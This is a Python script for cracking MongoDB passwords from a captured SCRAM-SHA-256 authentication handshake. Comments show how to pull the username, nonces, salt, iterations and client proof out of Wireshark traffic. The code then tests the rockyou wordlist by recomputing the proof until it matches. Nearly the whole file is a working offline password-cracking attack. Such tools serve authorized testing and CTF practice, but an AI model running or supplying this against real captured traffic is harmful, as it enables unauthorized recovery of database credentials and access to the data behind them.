#Cracking the mongodb Salted Challenge Response Authentication Mechanism (SCRAM) handshake

#!/usr/bin/python3

import base64
import hashlib
import hmac
import sys


#If you capture the traffic with wireshark
#It usually looks like the following
    #Client: admin.$cmd..............isMaster......saslSupportedMechs.....admin.admini...........
    
    #Server reply: ismaster...maxBsonObjectSize......maxMessageSizeBytes..l...maxWriteBatchSize.....	localTime....#w....logicalSessionTimeoutMinutes......minWireVersion......maxWireVersion......readOnly...saslSupportedMechs.-....0.....SCRAM-SHA-1..1.....SCRAM-SHA-256...ok........?

    #Client reply: {....saslStart......mechanism.....SCRAM-SHA-256..payload.-....n,,n=admin,r=+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeK.$db.....admin.                    -------n is USERNAME, r here is the CLIENT_NONCE---------

    #Server reply: conversationId......done...payload.u....r=+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D,s=zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg==,i=15000.ok           ---------r here is the server_NONCE, s means SALT, i mean ITERATIONS---------

    #Client reply: saslContinue......payload.x....c=biws,r=+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D,p=/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98=}   --------we only care about p here, which is TARGET"
                                                          

USERNAME = 'admin'                                                                #Change this 
SALT = 'zOa0kWA/OTak0a0vNaN0Zh2drO1uekoDUh4sdg=='                                 #Change this
CLIENT_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeK'                                 #Change this
SERVER_NONCE = '+CDTb3v9SwhwxAXb4+vZ32l0VsTvrLeKoGtDP4x0LH5WZgQ9xFMJEJknBHTp6N1D' #Change this
ITERATIONS = 15000                                                                #Change this
TARGET = '/nW1YVs0JcvxU48jLHanbkQbZ4GFJ8+Na8fj7xM1s98='                           #Change this
WORDLIST = '/usr/share/wordlists/rockyou.txt'

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def proof(username, password, salt, client_nonce, server_nonce, iterations):
    raw_salt = base64.b64decode(salt)
    client_first_bare = 'n={},r={}'.format(username, client_nonce)
    server_first = 'r={},s={},i={}'.format(server_nonce, salt, iterations)
    client_final_without_proof = 'c=biws,r={}'.format(server_nonce)               #??not sure if c=biws needs to change??
    auth_msg = '{},{},{}'.format(client_first_bare, server_first, client_final_without_proof)

    salted_password = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), raw_salt, iterations)  #Hash algo need change too
    client_key = hmac.digest(salted_password, b'Client Key', 'sha256')                               #Hash algo need change too
    stored_key = hashlib.sha256(client_key).digest()
    client_signature = hmac.new(stored_key, auth_msg.encode('utf-8'), 'sha256').digest()             #Hash algo need change too
    client_proof = byte_xor(client_key, client_signature)

    return base64.b64encode(client_proof).decode('utf-8')

counter = 0
with open(WORDLIST) as f:
    for candidate in f:
        counter = counter + 1
        if counter % 1000 == 0:
            print('Tried {} passwords'.format(counter))

        p = proof(USERNAME, candidate.rstrip('\n'), SALT, CLIENT_NONCE, SERVER_NONCE, ITERATIONS)
        if p == TARGET:
            print('Password found: {}'.format(candidate.rstrip('\n')))
            sys.exit(0)

print('Wordlist exhausted with no password found.')
